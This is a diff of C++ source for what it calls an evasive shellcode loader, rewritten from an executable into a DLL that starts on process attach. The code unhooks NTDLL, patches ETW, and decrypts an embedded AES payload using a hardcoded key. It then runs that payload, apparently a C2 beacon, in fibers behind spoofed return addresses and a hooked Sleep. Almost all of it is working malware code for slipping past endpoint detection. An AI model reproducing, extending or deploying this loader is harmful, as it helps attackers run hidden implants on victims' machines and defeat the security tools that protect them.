@@ -1,9 +1,7 @@
 /* Evasive shellcode loader designed to hide its execution from userland/kernel-land detections */
 
-
-
 #include <iostream>
-
+#include <windows.h>
 #include "allocator.h"
 #include "resolvers.h"
 #include "unhook.h"
@@ -15,134 +13,121 @@
 #include "rsrc.h"
 #include "functions.h"
 
-
-
-
-
+// Define exported functions
+extern "C" __declspec(dllexport) void InitializeLoader();
+extern "C" __declspec(dllexport) void ExecutePayload();
 
 PVOID Gdgt = FindROPGadget(); // used all across the project for ret address spoofing
 LPVOID InitialFiber;
-
-
 
 unsigned char* rc4key;
 unsigned long rc4keysize;
 NTSTATUS status;
 SIZE_T lpDataSize;
 
-
-
 PLARGE_PAGE_INFORMATION pLPI;
-
 
 unsigned char AesKey[] = { 0xBD, 0x19, 0x3D, 0x27, 0x69, 0x8C, 0xC6, 0x80, 0x86, 0x53, 0x8F, 0x3A, 0x53, 0x82, 0x16, 0x85, 0x9C, 0x01, 0x7C, 0xF3, 0xF9, 0xCA, 0x39, 0x1C, 0x08, 0x61, 0x6E, 0x05, 0x6F, 0x74, 0x7B, 0x08 };
 
-
 unsigned char AesIv[] = { 0xAD, 0xC7, 0xC0, 0x5B, 0xA8, 0xAB, 0x80, 0x21, 0x95, 0x8E, 0x46, 0xD6, 0x15, 0x6B, 0x8B, 0xA0 };
 
-
-
 /* AES vars */
-
 PBYTE AesCipherText;
-
 BOOL decryption;
-
 PVOID pPlainBuffer = nullptr;
 DWORD PlainBufferSize = 0;
-
 PVOID ptr = nullptr;
 DWORD ResourceSize;
-
 
 LPVOID Creation = nullptr;
 PVOID lpParameter = nullptr;
 
+void InitializeLoader() {
+    // Hide the debug console
+    FreeConsole();
 
+    FlushNTDLL();
+    PatchETW();
 
-int main() {
+    GetFromRc(ResourceSize, ptr);
+    AesCipherText = (PBYTE)malloc((SIZE_T)ResourceSize);
 
+    RetSpoofCall((void*)memcpy, 3, Gdgt, AesCipherText, ptr, (SIZE_T)ResourceSize);
 
-	FlushNTDLL();
-	PatchETW();
+    decryption = AESDecrypt(
+        AesCipherText,
+        ResourceSize,
+        AesKey,
+        AesIv,
+        &pPlainBuffer,
+        &PlainBufferSize
+    );
 
-	GetFromRc(ResourceSize, ptr);
-	AesCipherText = (PBYTE)malloc((SIZE_T)ResourceSize);
+    if (!decryption) {
+        std::cout << "[+] Decryption UnSuccessful" << std::endl;
+        return;
+    }
 
-	RetSpoofCall((void*)memcpy, 3, Gdgt, AesCipherText, ptr, (SIZE_T)ResourceSize);
+    pLPI = allocate_large_page(PlainBufferSize);
 
-	decryption = AESDecrypt(
-		AesCipherText,
-		ResourceSize,
-		AesKey,
-		AesIv,
-		&pPlainBuffer,
-		&PlainBufferSize
-	);
+    place_data_rand(pLPI, (PBYTE)pPlainBuffer, PlainBufferSize);
 
-	if (!decryption) {
-		std::cout << "[+] Decryption UnSuccessful" << std::endl;
-		return -1;
-	}
+    free(AesCipherText);
+    delete[] pPlainBuffer;
 
-	pLPI = allocate_large_page(PlainBufferSize);
+    HookFunction(Sleep, FiberSwitcher);
 
-	place_data_rand(pLPI, (PBYTE)pPlainBuffer, PlainBufferSize);
-
-	free(AesCipherText);
-
-	delete[] pPlainBuffer;
-
-
-	HookFunction(Sleep, FiberSwitcher);
-
-	InitialFiber = (LPVOID)RetSpoofCall((void*)e_ConvertThreadToFiber, 1, Gdgt, lpParameter); // converted the current thread to fiber (InitialFiber)
-
+    InitialFiber = (LPVOID)RetSpoofCall((void*)e_ConvertThreadToFiber, 1, Gdgt, lpParameter); // converted the current thread to fiber (InitialFiber)
 
 #ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Converted current thread to fiber\n";
+    std::cout << "[DEBUG] Converted current thread to fiber\n";
 #endif
 
+    ULONG OldAccessProtection = 0;
 
-	ULONG OldAccessProtection = 0;
+    status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &pLPI->lpPage, &pLPI->uSize, PAGE_EXECUTE_READ, &OldAccessProtection));
 
-	status = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &pLPI->lpPage, &pLPI->uSize, PAGE_EXECUTE_READ, &OldAccessProtection));
-	
-	NTAPI_VALIDATE_RETURN2NULL(NtProtect_MAIN, status);
+    NTAPI_VALIDATE_RETURN2NULL(NtProtect_MAIN, status);
 
-	Creation = RetSpoofCall((void*)e_CreateFiber, 3, Gdgt, NULL, (LPFIBER_START_ROUTINE)pLPI->lpData, NULL);  // Created a New fiber on the EntryPoint (PayloadFiber)
-
+    Creation = RetSpoofCall((void*)e_CreateFiber, 3, Gdgt, NULL, (LPFIBER_START_ROUTINE)pLPI->lpData, NULL);  // Created a New fiber on the EntryPoint (PayloadFiber)
 
 #ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Created the payload fiber\n";
+    std::cout << "[DEBUG] Created the payload fiber\n";
 #endif
-
-
-
-	while (true) { // main infinite loop
-	
-
-#ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Switching to payload fiber\n";
-#endif
-		
-	
-	RetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, Creation);
-		
-
-
-		// THIS PART IS EXECUTED AFTER THE BEACON CALLS SLEEP (FiberSwitcher)
-
-#ifdef _DEBUG_PRINT
-	std::cout << "[DEBUG] Sleeping...\n";
-#endif 
-
-		DelayExecution(dwSleepTime);
-
-		// and then back to loop start
-
-	}
-	
-
-	return 0;
 }
+
+void ExecutePayload() {
+    while (true) { // main infinite loop
+#ifdef _DEBUG_PRINT
+        std::cout << "[DEBUG] Switching to payload fiber\n";
+#endif
+
+        RetSpoofCall((void*)e_SwitchToFiber, 1, Gdgt, Creation);
+
+        // THIS PART IS EXECUTED AFTER THE BEACON CALLS SLEEP (FiberSwitcher)
+
+#ifdef _DEBUG_PRINT
+        std::cout << "[DEBUG] Sleeping...\n";
+#endif
+
+        DelayExecution(dwSleepTime);
+
+        // and then back to loop start
+    }
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+        case DLL_PROCESS_ATTACH:
+            InitializeLoader();
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
+}
+
+
+
